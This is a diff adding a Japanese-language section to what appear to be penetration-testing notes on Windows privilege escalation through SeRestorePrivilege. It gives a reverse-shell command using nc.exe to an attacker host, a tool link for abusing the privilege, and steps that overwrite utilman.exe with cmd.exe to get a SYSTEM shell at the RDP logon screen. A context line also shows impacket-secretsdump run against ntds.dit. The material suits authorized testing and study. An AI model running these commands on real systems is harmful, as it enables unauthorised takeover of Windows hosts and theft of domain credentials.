@@ -311,5 +311,58 @@ impacket-secretsdump -ntds ntds.dit -system system LOCAL
 
 
 
+# SeRestorePrivilege
+
+この特権により、ファイルのアクセス制御リスト（ACL）に関係なく、任意のシステムファイルへの**書き込みアクセス**が許可される。これにより、サービスの**変更**、DLLハイジャックの実行、さまざまな他の技術の中で、イメージファイル実行オプションを介して**デバッガ**を設定などを行える。
+
+## 権限の悪用
+
+SeRestorePrivilege権限を悪用するスクリプトを使用する
+
+[SeRestoreAbuse](https://github.com/xct/SeRestoreAbuse.git) このリポジトリをクローンしてVisual Studioで構成をReleaseにしてビルドする
+
+### リバースシェルを取得する
+
+```
+SeRestoreAbuse.exe "nc.exe <LHOST> <LPORT> -e powershell.exe"
+```
+
+## RDP による Utilman.exe の悪用
+
+utilman.exe**は、**ユーザーがシステムにログインする前に、拡大鏡、ハイコントラスト テーマ*、*ナレーター*、*オンスクリーン キーボードなどのシステム アクセシビリティ オプションを構成できるように設計された組み込みの Windows アプリケーションで、Windows ログオン画面で `WIN + U`キーの組み合わせを発行することで起動される。アプリケーションは SYSTEM 権限で実行される。
+
+### 権限が無効になっている場合
+
+[EnableSeRestorePrivilege.ps1](https://github.com/gtworek/PSBits/blob/master/Misc/EnableSeRestorePrivilege.ps1) で権限を有効にする
+
+```
+EnableSeRestorePrivilege.ps1
+```
+
+これで `C:\Windows\System32` の書き込みアクセス権が得られる
+
+### utilman.exeをcmd.exeに置き換える
+
+```
+move C:\Windows\System32\utilman.exe C:\Windows\System32\utilman.old
+move C:\Windows\System32\cmd.exe C:\Windows\System32\utilman.exe
+```
+
+### シェルを取得する
+
+```
+rdesktop <Target_IP>
+```
+
+RDPが機能するとWindowsのログイン画面が表示される。その画面で `Windows + U` を押すことでSYSTEMシェルを起動することができる。
+
+
+
+
+
+
+
+
+
 
 
